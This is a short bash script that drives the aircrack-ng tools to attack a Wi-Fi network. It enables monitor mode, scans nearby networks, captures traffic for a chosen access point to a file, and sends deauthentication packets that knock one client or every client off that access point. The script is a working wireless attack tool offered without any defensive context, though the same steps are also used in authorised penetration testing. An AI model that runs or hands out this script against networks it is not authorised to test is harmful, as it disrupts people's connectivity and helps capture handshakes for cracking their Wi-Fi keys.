#!/bin/bash

if ! iwconfig 2>&1 | grep -q "IEEE"; then
  echo "No Wireless Interfaces found"
  exit 1
fi

echo -n "Enter wireless interface: "
read interface

echo -n "Enter channel (or leave empty for none): "
read channel
channel=${channel:-none}

airmon-ng start "$interface" $channel
airmon-ng check kill

echo -n "Capture Time (minutes, default 1): "
read capturetime
capturetime=${capturetime:-1}

timeout ${capturetime}m airodump-ng wlan0mon

echo -n "Target BSSID: "
read targetbssid

echo -n "Target Channel: "
read targetchannel

echo -n "Write file name (default test): "
read file
file=${file:-test}

if [ "$targetchannel" != "" ]; then
  airodump-ng --bssid "$targetbssid" --channel "$targetchannel" --write "$file" wlan0mon
fi

echo -n "Target client MAC (leave empty to deauth entire BSSID): "
read targetclient

echo -n "Deauth packet size: "
read packetsize

if [ -z "$targetclient" ]; then
  aireplay-ng --deauth "$packetsize" -a "$targetbssid" wlan0mon
else
  aireplay-ng --deauth "$packetsize" -a "$targetbssid" -c "$targetclient" wlan0mon
fi
